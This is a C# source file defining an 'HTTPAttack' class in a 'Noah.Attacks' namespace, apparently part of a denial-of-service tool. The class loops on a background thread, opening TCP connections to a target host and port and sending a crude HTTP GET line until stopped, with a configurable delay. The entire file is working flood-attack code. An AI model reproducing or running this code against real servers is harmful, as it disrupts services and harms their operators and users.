using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Noah.Attacks
{
    public class HTTPAttack : IAttack
    {
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;
        private int port;

        public HTTPAttack(ApplicationState state, string host, int port = 80)
        {
            StringBuilder sb = new StringBuilder("GET ");
            sb.Append(host);
            sb.AppendLine(" HTTP/1.1");

            message = sb.ToString();
            this.state = state;
            ip = host;
            this.port = port;
        }

        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            state.State = States.Attacking;
            byte[] bytes = Encoding.ASCII.GetBytes(message);

            while (state.State != States.Done)
            {
                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {

                    sock.NoDelay = true;
                    sock.Connect(ip, port);
                    sock.Send(bytes, SocketFlags.None);
                }
                Thread.Sleep(state.Delay);
            }
        }
    }
}